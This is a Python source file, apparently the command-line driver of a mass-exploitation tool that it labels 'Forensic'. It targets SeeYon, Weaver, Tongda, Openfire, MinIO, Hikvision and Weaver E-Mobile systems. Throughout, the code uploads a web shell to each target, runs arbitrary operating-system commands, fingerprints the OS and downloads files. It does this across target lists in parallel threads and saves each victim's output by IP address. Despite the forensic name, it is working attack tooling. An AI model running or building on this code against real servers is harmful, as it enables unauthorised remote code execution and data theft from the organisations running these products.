import os, sys
import json
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib import parse
from core import *
from datetime import datetime


products = {
    "seeyon":           [SeeYon],
    "weaver":           [WeaVer],
    "openfire":         [OpenFire],
    "tongda":           [TongDa],
    "minio":            [Minio],
    "hikvision":        [Hikvision],
    "weaveremobile":    [WeaVerEMobile, WeaVerEMobile6601, WeaVerEMobile6602, WeaVerEMobileExpression]
}

class Forensic:
    def __init__(self, url, name, shell=""):
        self.exploits = []
        for product in products[name]:
            exploit = product(url)
            if shell != "":
                exploit.shell = shell
            self.exploits.append(exploit)

    def _getosinfo(self, expobj):
        content = expobj.attack("uname -a")
        if content == b"error":
            return b"error",content
        
        if b"linux" in content.lower():
            return b"linux",content
        
        content = expobj.attack("systeminfo")
        if content == b"error":
            return b"error",content
        
        if b"windows" in content.lower():
            return b"windows",content

        return b"unknown",content

    def run(self, method, args):
        content = b'error'
        for exploit in self.exploits:
            if not hasattr(exploit, method):
                print("Unsupported method")
                sys.exit(1)
            if exploit.upload() == ExploitStatus.SUCCESS:
                result = b''
                if isinstance(args, list):
                    for cmd in args:
                        result += getattr(exploit, method)(cmd)
                        result += b'\n'
                else:
                    result += getattr(exploit, method)(args)
                content = result
                exploit.clean()
            if content != b'error':
                break
        if content == b'error':
            self.exploits[0].log("Forensics failed", "error")
        return content

    def getbasicinfo(self):
        content = (b'error', b'error')
        for exploit in self.exploits:
            if exploit.upload() == ExploitStatus.SUCCESS:
                content = self._getosinfo(exploit)
                exploit.clean()
            if content[0] != b'error':
                break
        if content[0] == b'error':
            self.exploits[0].log("Forensics failed", "error")
        return content
    

def inCache(url, cachelist):
    if not cachelist:
        return False
    
    ip = parse.urlparse(url).netloc.split(':')[0]
    for cache in cachelist:
        if ip == cache.split('|')[0]:
            return True
    return False

def write_info(url, content):
    ip = parse.urlparse(url).netloc.split(':')[0]
    if isinstance(content, str):
        content = content.encode()

    if isinstance(content, tuple):
        osname = content[0]
        content = content[1]
        with open(BASICINFO, 'a') as f:
            f.write('{}|{}|{}\n'.format(ip, url, osname.decode()))
            f.flush()

    if not os.path.exists(CACHEDIR):
        os.mkdir(CACHEDIR)

    # write cache file
    path = os.path.join(CACHEDIR, CACHELIST)
    with open(path, 'a') as f:
        f.write('{}|{}\n'.format(ip, url))
        f.flush()

    if not os.path.exists(OUTPUT_DIR):
        os.mkdir(OUTPUT_DIR)

    path = os.path.join(OUTPUT_DIR, ip)
    with open(path, 'wb') as f:
        f.write(content)
        f.flush()

def worker(forensic, osname, args):
    content = b""
    if args.basic:
        content = forensic.getbasicinfo()
    elif args.cmd:
        if args.cmd.startswith("f:") and osname:
            with open(args.cmd[2:]) as f:
                cmds = json.load(f)
                if osname in cmds.keys():
                    content = forensic.run("attack", cmds[osname])
                else:
                    content = b"No command for this osname"
        else:
            content = forensic.run("attack", args.cmd)
    elif args.download:
        content = forensic.run("getfile", args.download)
    else:
        print("No operation specified")
        sys.exit(1)

    return content

CACHEDIR   = 'cache'
CACHELIST  = f'cache_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
OUTPUT_DIR = 'output'
BASICINFO  = f'basic_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url',   dest='url',  type=str, help='target url')
    parser.add_argument('-f', '--file',  dest='file', type=str, help='target file')
    parser.add_argument('-c', '--cmd',   dest='cmd',  type=str, help="execute command")
    parser.add_argument('-b', '--basic', dest='basic', action='store_true', help="get basic information")
    parser.add_argument('-d', '--download', dest='download', type=str, help="download directory")
    parser.add_argument('-m', '--model', dest='model', choices=['seeyon', 'weaver', 'openfire', 'weaveremobile', 'tongda', 'minio', 'hikvision'], required=True, help='target model')
    parser.add_argument('-s', '--shell', dest='shell', default="", type=str, help='shell name')
    parser.add_argument('--cache', dest='cache', action='store_true', help='enable cache')

    args = parser.parse_args()

    enable_cache = args.cache
    method = args.download
    if args.url:
        forensic = Forensic(args.url, args.model, args.shell)
        result = worker(forensic, None, args)
        if result != ErrorResult.content:
            write_info(args.url, result)

    elif args.file:
        with open(args.file, 'r') as f:
            targets = f.read().splitlines()
        
        cachelist = []
        tasks = {}
        if len(targets[0].split("|")) == 3:
            # handle format: ip|url|osname
            with ThreadPoolExecutor(6) as pool:
                for target in targets:
                    ip, url, osname = target.strip().split("|")
                    if enable_cache:
                        if inCache(url, cachelist):
                            continue
                    forensic = Forensic(url, args.model, args.shell)
                    tasks[pool.submit(worker, forensic, osname, args)] = url
        else:
            # handle format: url
            with ThreadPoolExecutor(6) as pool:
                for target in targets:
                    target = target.strip()
                    # If the target is in the cache, it is skipped.
                    if enable_cache:
                        if inCache(target, cachelist):
                            continue
                    forensic = Forensic(target, args.model, args.shell)
                    tasks[pool.submit(worker, forensic, None, args)] = target

        for f in as_completed(tasks):
            result = f.result()
            if result == ErrorResult.content:
                continue
            write_info(tasks[f], result)
            ip = parse.urlparse(tasks[f]).netloc.split(':')[0]
            cachelist.append('{}|{}'.format(ip, tasks[f]))

